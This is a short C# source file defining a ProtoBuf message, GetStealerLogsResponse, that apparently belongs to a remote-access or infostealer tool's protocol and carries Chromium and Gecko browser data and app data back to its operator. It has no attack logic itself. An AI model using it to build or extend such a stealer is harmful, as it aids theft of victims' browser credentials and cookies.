

using InvokedCommon.Structs;
using ProtoBuf;


namespace InvokedCommon.Messages
{
	[ProtoContract]
	public class GetStealerLogsResponse : IMessage
	{
		[ProtoMember(1)]
		public ChromiumBrowser[] chromiumData { get; set; }

		[ProtoMember(2)]
		public GeckoBrowser[] geckoData { get; set; }

		[ProtoMember(3)]
		public AppsData appsData { get; set; }
	}
}
